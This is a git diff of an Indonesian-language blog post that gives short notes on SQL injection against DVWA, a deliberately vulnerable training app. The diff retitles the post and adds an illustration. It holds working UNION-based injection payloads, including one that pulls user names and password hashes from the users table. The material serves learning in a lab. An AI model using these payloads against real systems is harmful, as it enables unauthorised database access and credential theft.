@@ -1,10 +1,11 @@
 ---
 layout: post
-title: "(a chunk) Injeksi SQL - dvwa"
+title: "Sekelumit Injeksi SQL - dvwa"
 date: 2019-02-28 05:22:15 +0000
 categories: Technology
 comments: false
 ---
+catatan dari → [catatan sebelumnya tentang dvwa](https://immsswd.github.io/technology/install-dvwa) 
 - bisa melihat user yang ada akses database:
 
 ```sql
@@ -31,3 +32,7 @@ select first_name, last_name from users where user_id = '%' and 1=0 union select
 select first_name, last_name from users where user_id = '%' and 1=0 union select null, concat(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) from users #';
 
 {% endhighlight %}
+
+ilustrasi:
+menggunakan `%' or 0=0 union select null, user() #` di form:
+![injsql](/assets/img/20190122/3.png)
